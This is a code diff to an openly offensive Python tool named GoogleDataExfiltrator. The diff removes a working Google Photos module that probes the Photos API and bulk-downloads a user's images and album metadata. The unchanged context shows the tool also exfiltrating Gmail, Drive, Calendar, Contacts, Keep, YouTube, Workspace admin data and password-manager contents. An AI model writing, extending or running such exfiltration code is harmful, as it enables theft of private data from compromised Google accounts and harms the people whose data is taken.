@@ -47,7 +47,6 @@ class GoogleDataExfiltrator:
             'drive_files': 50,          # Max files to download
             'calendar_events': 1000,    # Max events per calendar
             'contacts': None,           # None = unlimited
-            'photos': 50,               # Max photos to download
             'tasks': None,              # None = unlimited
             'keep_notes': 100,          # Max notes to download
             'youtube_videos': 500       # Max liked videos
@@ -239,24 +238,6 @@ class GoogleDataExfiltrator:
                 print("✗ Empty")
         except Exception as e:
             active_services['contacts'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
-        
-        # Probe Google Photos
-        print("[*] Probing Google Photos...", end=" ")
-        try:
-            results = self.services['photoslibrary'].mediaItems().list(pageSize=1).execute()
-            items = results.get('mediaItems', [])
-            if items:
-                active_services['photos'] = {
-                    'active': True,
-                    'has_media': True
-                }
-                print("✓ ACTIVE (Photos/videos found)")
-            else:
-                active_services['photos'] = {'active': False, 'reason': 'No media'}
-                print("✗ Empty")
-        except Exception as e:
-            active_services['photos'] = {'active': False, 'reason': str(e)}
             print(f"✗ Error: {e}")
         
         # Probe Google Tasks
@@ -676,100 +657,6 @@ class GoogleDataExfiltrator:
             
         except Exception as e:
             print(f"[-] Error in Contacts exfiltration: {e}")
-    
-    def exfiltrate_photos(self):
-        """Exfiltrate Google Photos metadata and images"""
-        print("\n[*] Starting Google Photos exfiltration...")
-        photos_dir = self.output_dir / 'photos'
-        photos_dir.mkdir(exist_ok=True)
-        
-        images_dir = photos_dir / 'images'
-        images_dir.mkdir(exist_ok=True)
-        
-        try:
-            # Get all media items
-            media_items = []
-            page_token = None
-            photo_limit = self.limits['photos']
-            
-            print("[+] Retrieving photo metadata...")
-            while True:
-                body = {'pageSize': 100}
-                if page_token:
-                    body['pageToken'] = page_token
-                
-                results = self.services['photoslibrary'].mediaItems().list(**body).execute()
-                
-                items = results.get('mediaItems', [])
-                media_items.extend(items)
-                page_token = results.get('nextPageToken')
-                
-                # Apply limit
-                if photo_limit and len(media_items) >= photo_limit:
-                    media_items = media_items[:photo_limit]
-                    print(f"[!] Limited to {photo_limit} media items")
-                    break
-                
-                if not page_token:
-                    break
-                print(f"[+] Retrieved {len(media_items)} media items so far...")
-            
-            # Save metadata
-            with open(photos_dir / 'media_items.json', 'w') as f:
-                json.dump(media_items, f, indent=2)
-            print(f"[+] Total media items: {len(media_items)}")
-            
-            # Download photos
-            print("[+] Downloading photos...")
-            for idx, item in enumerate(media_items):
-                try:
-                    # Get download URL
-                    base_url = item.get('baseUrl')
-                    filename = item.get('filename', f'photo_{idx}.jpg')
-                    
-                    # Download the image
-                    import requests
-                    response = requests.get(f"{base_url}=d")
-                    
-                    if response.status_code == 200:
-                        filepath = images_dir / filename
-                        with open(filepath, 'wb') as f:
-                            f.write(response.content)
-                    
-                    if (idx + 1) % 10 == 0:
-                        print(f"[+] Downloaded {idx + 1}/{len(media_items)} photos")
-                        
-                except Exception as e:
-                    print(f"[-] Error downloading photo {item.get('filename', 'unknown')}: {e}")
-            
-            # Get albums
-            print("[+] Retrieving albums...")
-            albums = []
-            page_token = None
-            
-            while True:
-                body = {'pageSize': 50}
-                if page_token:
-                    body['pageToken'] = page_token
-                
-                results = self.services['photoslibrary'].albums().list(**body).execute()
-                
-                items = results.get('albums', [])
-                albums.extend(items)
-                page_token = results.get('nextPageToken')
-                
-                if not page_token:
-                    break
-            
-            with open(photos_dir / 'albums.json', 'w') as f:
-                json.dump(albums, f, indent=2)
-            print(f"[+] Retrieved {len(albums)} albums")
-            
-            print(f"[+] Photos exfiltration complete")
-            
-        except Exception as e:
-            print(f"[-] Error in Photos exfiltration: {e}")
-            print("[!] Make sure Photos Library API is enabled in Google Cloud Console")
     
     def exfiltrate_tasks(self):
         """Exfiltrate Google Tasks"""
@@ -1283,7 +1170,6 @@ class GoogleDataExfiltrator:
         self.exfiltrate_drive()
         self.exfiltrate_calendar()
         self.exfiltrate_contacts()
-        self.exfiltrate_photos()
         self.exfiltrate_tasks()
         self.exfiltrate_keep()
         self.exfiltrate_youtube()
@@ -1330,7 +1216,6 @@ class GoogleDataExfiltrator:
             'drive': self.exfiltrate_drive,
             'calendar': self.exfiltrate_calendar,
             'contacts': self.exfiltrate_contacts,
-            'photos': self.exfiltrate_photos,
             'tasks': self.exfiltrate_tasks,
             'keep': self.exfiltrate_keep,
             'youtube': self.exfiltrate_youtube,
@@ -1433,7 +1318,6 @@ class GoogleDataExfiltrator:
                 'drive': self.exfiltrate_drive,
                 'calendar': self.exfiltrate_calendar,
                 'contacts': self.exfiltrate_contacts,
-                'photos': self.exfiltrate_photos,
                 'tasks': self.exfiltrate_tasks,
                 'keep': self.exfiltrate_keep,
                 'youtube': self.exfiltrate_youtube,
@@ -1591,8 +1475,6 @@ Examples:
             exfiltrator.exfiltrate_calendar()
         if args.contacts:
             exfiltrator.exfiltrate_contacts()
-        if args.photos:
-            exfiltrator.exfiltrate_photos()
         if args.tasks:
             exfiltrator.exfiltrate_tasks()
         if args.keep:
@@ -1608,7 +1490,7 @@ Examples:
             exfiltrator.check_password_manager()
         
         if not any([args.gmail, args.drive, args.calendar, args.contacts, 
-                   args.photos, args.tasks, args.keep, args.youtube,
+                   args.tasks, args.keep, args.youtube,
                    args.workspace, args.workspace_admin, args.passwords]):
             print("No exfiltration method specified. Use --active-only, --all, or specify individual methods.")
             parser.print_help()
